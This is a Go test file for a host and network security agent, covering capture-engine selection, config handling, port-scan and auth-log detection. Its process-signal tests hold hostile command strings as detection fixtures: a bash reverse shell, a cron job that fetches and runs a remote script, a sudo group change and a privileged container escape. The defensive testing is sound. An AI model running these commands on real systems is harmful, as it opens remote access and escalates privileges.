package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestParseRouteDev(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		wantIF string
	}{
		{
			name:   "route get format",
			input:  "8.8.8.8 via 172.17.0.1 dev eth0 src 172.17.0.2 uid 0\n",
			wantIF: "eth0",
		},
		{
			name:   "default route format",
			input:  "default via 192.168.1.1 dev ens33 proto dhcp metric 100",
			wantIF: "ens33",
		},
		{
			name:   "missing dev token",
			input:  "default via 192.168.1.1 proto dhcp metric 100",
			wantIF: "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := parseRouteDev(tc.input); got != tc.wantIF {
				t.Fatalf("parseRouteDev() = %q, want %q", got, tc.wantIF)
			}
		})
	}
}

func TestResolveTrafficInterface(t *testing.T) {
	t.Run("explicit override wins", func(t *testing.T) {
		cfg := &Config{TrafficInterface: "ens160", API: "http://127.0.0.1:8080"}
		if got := resolveTrafficInterface(cfg); got != "ens160" {
			t.Fatalf("resolveTrafficInterface() = %q, want ens160", got)
		}
	})

	t.Run("auto resolves to host default route", func(t *testing.T) {
		cfg := &Config{TrafficInterface: "auto", API: "http://127.0.0.1:8080"}
		got := resolveTrafficInterface(cfg)
		if got == "" || got == "lo" || got == "eth0" {
			t.Fatalf("resolveTrafficInterface() = %q, want active non-loopback default-route interface", got)
		}
	})
}

func TestSelectCaptureEngine(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"", "af_packet"},
		{"auto", "af_packet"},
		{"afpacket", "af_packet"},
		{"ebpf", "ebpf"},
		{"pf_ring", "pfring"},
		{"procfs", "procfs"},
		{"unknown", "af_packet"},
	}
	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			if got := selectCaptureEngine(tc.input); got != tc.want {
				t.Fatalf("selectCaptureEngine(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestResolveCaptureCapabilityIsHonestAboutFallbacks(t *testing.T) {
	tests := []struct {
		name            string
		requested       string
		wantActive      string
		wantStatus      string
		wantReasonEmpty bool
	}{
		{"af packet active", "af_packet", "af_packet", "active", true},
		{"ebpf falls back", "ebpf", "af_packet", "fallback", false},
		{"procfs fallback", "procfs", "procfs", "fallback", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := resolveCaptureCapability(tc.requested)
			if got.ActiveEngine != tc.wantActive || got.Status != tc.wantStatus {
				t.Fatalf("resolveCaptureCapability(%q) = active %q status %q, want active %q status %q", tc.requested, got.ActiveEngine, got.Status, tc.wantActive, tc.wantStatus)
			}
			if tc.wantReasonEmpty && got.FallbackReason != "" {
				t.Fatalf("FallbackReason = %q, want empty", got.FallbackReason)
			}
			if !tc.wantReasonEmpty && got.FallbackReason == "" {
				t.Fatal("FallbackReason is empty, want explicit fallback reason")
			}
		})
	}
}

func TestCentOS7KernelEBPFUnsupportedGate(t *testing.T) {
	if !isCentOS7Kernel("3.10.0-1160.el7.x86_64") {
		t.Fatal("CentOS7 3.10 kernel should be detected as unsupported for eBPF")
	}
	if isCentOS7Kernel("4.18.0-425.el8.x86_64") {
		t.Fatal("EL8 4.18 kernel should not be treated as CentOS7 eBPF-unsupported")
	}
}

func TestCapabilityModelIncludesModuleStatuses(t *testing.T) {
	agent := NewAgent(&Config{
		TrafficEnabled:   true,
		CaptureEngine:    "ebpf",
		TrafficInterface: "ens33",
		BPFFilter:        "tcp or udp",
		RawStream:        "flows:raw",
		SemanticStream:   "flows:semantic",
		HIDSEnabled:      true,
		RuntimeStream:    "alerts:runtime",
		RASPEnabled:      true,
		RASPStream:       "alerts:rasp",
		AssetEnabled:     true,
	})

	model := agent.capabilityModel()
	if model["schema_version"] != "lyflow.agent.capability.v1" {
		t.Fatalf("schema_version = %v", model["schema_version"])
	}
	traffic := model["traffic_collector"].(map[string]interface{})
	if traffic["requested_engine"] != "ebpf" || traffic["active_engine"] != "af_packet" || traffic["backend_status"] != "fallback" {
		t.Fatalf("traffic capability not honest about ebpf fallback: %+v", traffic)
	}
	runtimeSensor := model["runtime_sensor"].(map[string]interface{})
	if runtimeSensor["enabled"] != true || runtimeSensor["stream"] != "alerts:runtime" {
		t.Fatalf("runtime capability mismatch: %+v", runtimeSensor)
	}
	rasp := model["rasp_probe_manager"].(map[string]interface{})
	if rasp["python"] != "sitecustomize_runtime_hooks" || rasp["php"] != "native_extension_with_prepend_fallback" || rasp["java"] != "javaagent_security_jdbc_hooks" {
		t.Fatalf("rasp hook capability labels missing: %+v", rasp)
	}
}

func TestApplyPulledConfigUpdatesCollectorDesiredState(t *testing.T) {
	agent := NewAgent(&Config{
		TrafficEnabled:   true,
		TrafficInterface: "ens33",
		CaptureEngine:    "af_packet",
		BPFFilter:        "tcp or udp",
		Promiscuous:      true,
		HIDSEnabled:      true,
		RASPEnabled:      true,
	})

	agent.applyPulledConfig(map[string]interface{}{
		"policy": map[string]interface{}{
			"traffic": map[string]interface{}{"enabled": false, "interface": "auto", "capture_engine": "procfs", "bpf_filter": "udp", "promiscuous": false},
			"runtime": map[string]interface{}{"enabled": false},
			"rasp":    map[string]interface{}{"enabled": false},
		},
	})

	if agent.cfg.TrafficEnabled || agent.cfg.HIDSEnabled || agent.cfg.RASPEnabled {
		t.Fatalf("collector desired state not disabled: traffic=%v hids=%v rasp=%v", agent.cfg.TrafficEnabled, agent.cfg.HIDSEnabled, agent.cfg.RASPEnabled)
	}
	if agent.cfg.TrafficInterface != "ens33" {
		t.Fatalf("auto interface should not overwrite selected interface, got %q", agent.cfg.TrafficInterface)
	}
	if agent.cfg.CaptureEngine != "procfs" || agent.cfg.BPFFilter != "udp" || agent.cfg.Promiscuous {
		t.Fatalf("traffic config not applied: engine=%q filter=%q promiscuous=%v", agent.cfg.CaptureEngine, agent.cfg.BPFFilter, agent.cfg.Promiscuous)
	}

	agent.applyPulledConfig(map[string]interface{}{
		"policy": map[string]interface{}{
			"traffic": map[string]interface{}{"enabled": "true", "interface": "ens160"},
			"runtime": map[string]interface{}{"enabled": "true"},
			"rasp":    map[string]interface{}{"enabled": "true"},
		},
	})

	if !agent.cfg.TrafficEnabled || !agent.cfg.HIDSEnabled || !agent.cfg.RASPEnabled {
		t.Fatalf("collector desired state not enabled: traffic=%v hids=%v rasp=%v", agent.cfg.TrafficEnabled, agent.cfg.HIDSEnabled, agent.cfg.RASPEnabled)
	}
	if agent.cfg.TrafficInterface != "ens160" {
		t.Fatalf("TrafficInterface = %q, want ens160", agent.cfg.TrafficInterface)
	}
}

func TestTrafficCaptureEnabledRequiresSameInterface(t *testing.T) {
	agent := NewAgent(&Config{TrafficEnabled: true, TrafficInterface: "ens33"})
	if !agent.trafficCaptureEnabledOnCurrentInterface("ens33") {
		t.Fatal("capture should be enabled on configured interface")
	}
	if agent.trafficCaptureEnabledOnCurrentInterface("ens160") {
		t.Fatal("capture should pause after mirror interface changes")
	}
	agent.cfg.TrafficEnabled = false
	if agent.trafficCaptureEnabledOnCurrentInterface("ens33") {
		t.Fatal("capture should pause when traffic is disabled")
	}
}

func TestRuntimeFallbackEventCarriesHonestBackendMetadata(t *testing.T) {
	agent := NewAgent(&Config{HIDSEnabled: true, RuntimeStream: "alerts:runtime"})
	agent.agentID = "agent-runtime-test"
	event := buildSyntheticRuntimeEvent(agent, "ebpf", "ebpf-fallback")

	if event.Strategy != "ebpf" || event.Backend != "ebpf-fallback" {
		t.Fatalf("runtime event backend mismatch: %#v", event)
	}
	if event.CapabilityStatus != "fallback" {
		t.Fatalf("CapabilityStatus = %q, want fallback", event.CapabilityStatus)
	}
	if event.SourceEvidence == "" {
		t.Fatal("SourceEvidence is empty")
	}
	if event.Metadata["collector"] != "synthetic-fallback" {
		t.Fatalf("collector metadata missing: %#v", event.Metadata)
	}
	if event.Metadata["fallback_reason"] == "" {
		t.Fatalf("fallback_reason metadata missing: %#v", event.Metadata)
	}
}

func TestUnsupportedRuntimeBackendDoesNotEmitSyntheticEvent(t *testing.T) {
	agent := NewAgent(&Config{HIDSEnabled: true, RuntimeStream: "alerts:runtime"})
	agent.agentID = "agent-runtime-test"
	backend := NewRuntimeMonitorBackend("unsupported")
	events := backend.Collect(agent)
	if len(events) != 0 {
		t.Fatalf("expected no synthetic fallback events, got %d", len(events))
	}
}

func TestHIDSProcessSignalCoversElkeidWazuhLikePatterns(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		wantSeverity string
		wantSignal   string
	}{
		{"reverse shell", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "high", "reverse-shell-or-dangerous-exec"},
		{"persistence", "crontab -l && echo '* * * * * curl http://x/p.sh|sh'", "medium", "persistence-change"},
		{"credential", "usermod -aG sudo attacker", "high", "credential-or-account-change"},
		{"container escape", "docker run --privileged -v /:/host alpine", "high", "container-privilege-escalation"},
		{"ordinary", "/usr/bin/true", "low", "new-process"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sev, signal := processSignal(processSnapshot{Cmdline: tt.cmd})
			if sev != tt.wantSeverity || signal != tt.wantSignal {
				t.Fatalf("processSignal() = %q/%q, want %q/%q", sev, signal, tt.wantSeverity, tt.wantSignal)
			}
		})
	}
}

func TestHIDSAuthSignalCoversPrivilegeAndAccountChanges(t *testing.T) {
	tests := []struct {
		line          string
		wantEventType string
		wantSeverity  string
		wantOK        bool
	}{
		{"sshd[1]: Accepted password for root from 203.0.113.10 port 22 ssh2", "runtime.auth.root_login", "high", true},
		{"sudo: pam_unix(sudo:auth): authentication failure", "runtime.auth.sudo_failure", "medium", true},
		{"sshd[1]: Failed password for invalid user test from 1.1.1.1", "runtime.auth.failure", "medium", true},
		{"useradd[1]: new user: name=attacker, UID=1001", "runtime.auth.account_change", "high", true},
		{"kernel: ordinary line", "", "", false},
	}
	for _, tt := range tests {
		eventType, severity, _, ok := classifyAuthSignal(tt.line)
		if eventType != tt.wantEventType || severity != tt.wantSeverity || ok != tt.wantOK {
			t.Fatalf("classifyAuthSignal(%q) = %q/%q/%v, want %q/%q/%v", tt.line, eventType, severity, ok, tt.wantEventType, tt.wantSeverity, tt.wantOK)
		}
	}
}

func TestHIDSFileSignalSeverityCoversPersistenceFiles(t *testing.T) {
	if got := fileSignalSeverity("/etc/ld.so.preload"); got != "high" {
		t.Fatalf("ld.so.preload severity = %q, want high", got)
	}
	if got := fileSignalSeverity("/root/.ssh/authorized_keys"); got != "medium" {
		t.Fatalf("authorized_keys severity = %q, want medium", got)
	}
}

func TestTrafficRetentionWritesBoundedReferenceForSuspiciousFlow(t *testing.T) {
	dir := t.TempDir()
	agent := NewAgent(&Config{RetentionEnabled: true, RetentionDir: dir})
	agent.agentID = "agent-retention"
	agent.hostname = "host-retention"
	ref, err := agent.retainTrafficReference("flow-1", trafficObservation{HTTPPath: "/admin/upload", HTTPHost: "app.local", Protocol: "TCP"}, "upload")
	if err != nil {
		t.Fatalf("retainTrafficReference error: %v", err)
	}
	if ref == nil || ref["capture_ref"] == "" || ref["cleanup_policy"] == "" {
		t.Fatalf("retention reference missing fields: %#v", ref)
	}
	data, err := os.ReadFile(filepath.Join(dir, "flow-1.json"))
	if err != nil {
		t.Fatalf("expected retention metadata file: %v", err)
	}
	if len(data) > 4096 {
		t.Fatalf("retention file too large: %d", len(data))
	}
	var payload map[string]interface{}
	if err := json.Unmarshal(data, &payload); err != nil {
		t.Fatalf("retention file is not JSON: %v", err)
	}
}

func TestTrafficRetentionDisabledWritesNoReference(t *testing.T) {
	dir := t.TempDir()
	agent := NewAgent(&Config{RetentionEnabled: false, RetentionDir: dir})
	ref, err := agent.retainTrafficReference("flow-disabled", trafficObservation{HTTPPath: "/admin"}, "admin_access")
	if err != nil {
		t.Fatalf("retainTrafficReference error: %v", err)
	}
	if ref != nil {
		t.Fatalf("expected nil reference when retention disabled, got %#v", ref)
	}
	if _, err := os.Stat(filepath.Join(dir, "flow-disabled.json")); !os.IsNotExist(err) {
		t.Fatalf("expected no retention file, stat err=%v", err)
	}
}

func TestParseProcNetAddr(t *testing.T) {
	ip, port := parseProcNetAddr("6401A8C0:1F90")
	if ip != "192.168.1.100" || port != 8080 {
		t.Fatalf("parseProcNetAddr() = %s:%d, want 192.168.1.100:8080", ip, port)
	}
}

func TestParseHTTPRequest(t *testing.T) {
	method, path, host, ok := parseHTTPRequest([]byte("POST /login HTTP/1.1\r\nHost: app.example\r\n\r\n"))
	if !ok || method != "POST" || path != "/login" || host != "app.example" {
		t.Fatalf("parseHTTPRequest() = %q %q %q %v", method, path, host, ok)
	}
}

func TestBusinessActionForObservation(t *testing.T) {
	if got := businessActionForObservation(trafficObservation{HTTPPath: "/admin/users", Protocol: "TCP"}); got != "admin_access" {
		t.Fatalf("businessActionForObservation() = %q, want admin_access", got)
	}
	if got := businessActionForObservation(trafficObservation{DNSQuery: "example.com", Protocol: "UDP"}); got != "dns_query" {
		t.Fatalf("businessActionForObservation() = %q, want dns_query", got)
	}
}

func TestPortScanDetectorEmitsAlertBeforeTrafficRateLimit(t *testing.T) {
	agent := NewAgent(&Config{TrafficInterface: "ens33"})
	agent.agentID = "agent-ubuntu-dd6dbe2f"
	agent.hostname = "ubuntu"
	agent.localIP = "10.1.18.8"
	detector := newPortScanDetector()
	now := time.Date(2026, 5, 26, 12, 12, 0, 0, time.UTC)
	var alert map[string]interface{}
	for port := uint16(1); port <= 20; port++ {
		alert = detector.observe(trafficObservation{Timestamp: now.Add(time.Duration(port) * time.Millisecond), Engine: "af_packet", Interface: "ens33", SrcIP: "10.1.18.100", DstIP: "10.1.18.8", SrcPort: 50000 + port, DstPort: port, Protocol: "TCP", TCPSYN: true, Direction: "ingress"}, agent)
	}
	if alert == nil {
		t.Fatal("expected port scan alert after 20 distinct destination ports")
	}
	if got := alert["event_type"]; got != "traffic.port_scan" {
		t.Fatalf("event_type = %v, want traffic.port_scan", got)
	}
	if got := alert["agent_id"]; got != "agent-ubuntu-dd6dbe2f" {
		t.Fatalf("agent_id = %v, want dns8 agent id", got)
	}
	if got := alert["dst_ip"]; got != "10.1.18.8" {
		t.Fatalf("dst_ip = %v, want 10.1.18.8", got)
	}
	if got := alert["distinct_dst_ports"]; got != int64(20) {
		t.Fatalf("distinct_dst_ports = %v, want 20", got)
	}
}

func TestPortScanDetectorPrunesExpiredEntries(t *testing.T) {
	detector := newPortScanDetector()
	detector.entries["old"] = &portScanEntry{firstSeen: time.Now().Add(-3 * time.Minute), lastSeen: time.Now().Add(-3 * time.Minute), ports: map[uint16]struct{}{22: {}}}
	detector.prune(time.Now())
	if _, ok := detector.entries["old"]; ok {
		t.Fatal("expected expired port scan entry to be pruned")
	}
}

func TestParseTLSServerNameExtension(t *testing.T) {
	data := []byte{0x00, 0x0e, 0x00, 0x00, 0x0b}
	data = append(data, []byte("example.com")...)
	if got := parseTLSServerNameExtension(data); got != "example.com" {
		t.Fatalf("parseTLSServerNameExtension() = %q, want example.com", got)
	}
}

func TestServerHostFromAPI(t *testing.T) {
	tests := []struct {
		name string
		api  string
		want string
	}{
		{name: "full url", api: "https://example.com:9443/api", want: "example.com"},
		{name: "host only auto add scheme", api: "api.internal:8080", want: "api.internal"},
		{name: "empty", api: "", want: ""},
		{name: "bad url", api: "http://[::1", want: ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := serverHostFromAPI(tc.api); got != tc.want {
				t.Fatalf("serverHostFromAPI() = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResolveConfigPath(t *testing.T) {
	oldConfigFile := os.Getenv("CONFIG_FILE")
	oldAgentConfig := os.Getenv("AGENT_CONFIG")
	t.Cleanup(func() {
		_ = os.Setenv("CONFIG_FILE", oldConfigFile)
		_ = os.Setenv("AGENT_CONFIG", oldAgentConfig)
	})

	t.Run("flag equals has highest priority", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent", "--config=/tmp/a.yaml"})
		if got != "/tmp/a.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/a.yaml")
		}
	})

	t.Run("flag value has priority over env", func(t *testing.T) {
		_ = os.Setenv("CONFIG_FILE", "/tmp/env.yaml")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent", "--config", " /tmp/flag.yaml "})
		if got != "/tmp/flag.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/flag.yaml")
		}
	})

	t.Run("config_file env fallback", func(t *testing.T) {
		_ = os.Setenv("CONFIG_FILE", "/tmp/env-config.yaml")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != "/tmp/env-config.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/env-config.yaml")
		}
	})

	t.Run("agent_config env fallback", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Setenv("AGENT_CONFIG", "/tmp/agent-config.yaml")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != "/tmp/agent-config.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/agent-config.yaml")
		}
	})

	t.Run("default fallback", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != defaultConfigFile {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, defaultConfigFile)
		}
	})
}

func TestParseSimpleYAML(t *testing.T) {
	dir := t.TempDir()
	configPath := filepath.Join(dir, "agent.yaml")
	content := `
# top-level
server:
  api: "http://127.0.0.1:9000" # inline comment
  redis: '127.0.0.1:6379'
agent:
  id: abc
traffic:
  enabled: true
  interface: eth1
  streams:
    raw: flows:raw
    semantic: flows:semantic
session:
  enabled: true
  stream: sessions:semantic
invalid line without colon
flat_key: flat_value
`
	if err := os.WriteFile(configPath, []byte(content), 0o600); err != nil {
		t.Fatalf("write temp yaml: %v", err)
	}

	vals, err := parseSimpleYAML(configPath)
	if err != nil {
		t.Fatalf("parseSimpleYAML() error = %v", err)
	}

	want := map[string]string{
		"server.api":               "http://127.0.0.1:9000",
		"server.redis":             "127.0.0.1:6379",
		"agent.id":                 "abc",
		"traffic.enabled":          "true",
		"traffic.interface":        "eth1",
		"traffic.streams.raw":      "flows:raw",
		"traffic.streams.semantic": "flows:semantic",
		"session.enabled":          "true",
		"session.stream":           "sessions:semantic",
		"flat_key":                 "flat_value",
	}

	for k, v := range want {
		if got := vals[k]; got != v {
			t.Fatalf("parseSimpleYAML()[%q] = %q, want %q", k, got, v)
		}
	}
}
